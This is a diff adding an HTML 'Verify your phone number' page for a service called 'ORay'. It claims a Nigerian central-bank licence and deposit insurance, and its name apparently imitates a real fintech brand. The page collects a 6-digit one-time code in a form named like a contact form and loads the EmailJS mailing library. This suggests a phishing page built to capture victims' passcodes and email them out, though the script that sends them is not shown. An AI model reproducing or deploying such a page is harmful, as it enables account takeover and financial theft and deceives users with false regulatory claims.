@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>ORay - Verify</title>
+
+    <link rel="stylesheet" href="otp.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="app.js" defer></script>
+</head>
+<body>
+    <br><br>
+    <main class="otp-page">
+
+        <!-- ORay Header -->
+        <header class="top">
+            <img src="logo.png" alt="ORay" class="logo">
+        </header>
+
+        <!-- OTP Content -->
+        <section class="otp-container">
+
+            <h1>Verify your phone number</h1>
+
+            <p class="instruction">
+                Enter the 6-digit verification code sent to
+            </p>
+
+            <p class="phone-number" id="display-phone">
+                +234 *** **** ****
+            </p>
+
+            <!-- Correctly nested Form wrapper -->
+            <form id="contactForm">
+                <div class="otp-boxes">
+                    <input
+                        type="text"
+                        maxlength="1"
+                        inputmode="numeric"
+                        autocomplete="one-time-code"
+                        class="otp-input"
+                        id="message1"
+                        name="code1"
+                    >
+
+                    <input
+                        type="text"
+                        maxlength="1"
+                        inputmode="numeric"
+                        class="otp-input"
+                        id="message2"
+                        name="code2"
+                    >
+
+                    <input
+                        type="text"
+                        maxlength="1"
+                        inputmode="numeric"
+                        class="otp-input"
+                        id="message3"
+                        name="code3"
+                    >
+
+                    <input
+                        type="text"
+                        maxlength="1"
+                        inputmode="numeric"
+                        class="otp-input"
+                        id="message4"
+                        name="code4"
+                    >
+
+                    <input
+                        type="text"
+                        maxlength="1"
+                        inputmode="numeric"
+                        class="otp-input"
+                        id="message5"
+                        name="code5"
+                    >
+
+                    <input
+                        type="text"
+                        maxlength="1"
+                        inputmode="numeric"
+                        class="otp-input"
+                        id="message6"
+                        name="code6"
+                    >
+                </div>
+
+                <!-- Countdown inside form context -->
+                <p class="countdown">
+                    Resend code in <strong>02:00</strong>
+                </p>
+
+                <!-- Verify -->
+                <button type="submit" class="verify-button">
+                    Verify &amp; Continue
+                </button>
+            </form>
+
+            <!-- Change Number -->
+            <a href="index.html" class="change-number">
+                Change phone number
+            </a>
+
+            <!-- Cancel -->
+            <a href="login.html" class="cancel">
+                Cancel
+            </a>
+
+            <!-- License -->
+            <div class="license">
+                <span class="cbn-icon">🇳🇬</span>
+                <span>
+                    Licensed by the
+                    <strong>CBN</strong>
+                    and insured by the
+                    <strong>NDIC</strong>
+                </span>
+            </div>
+
+        </section>
+
+    </main>
+
+</body>
+</html>
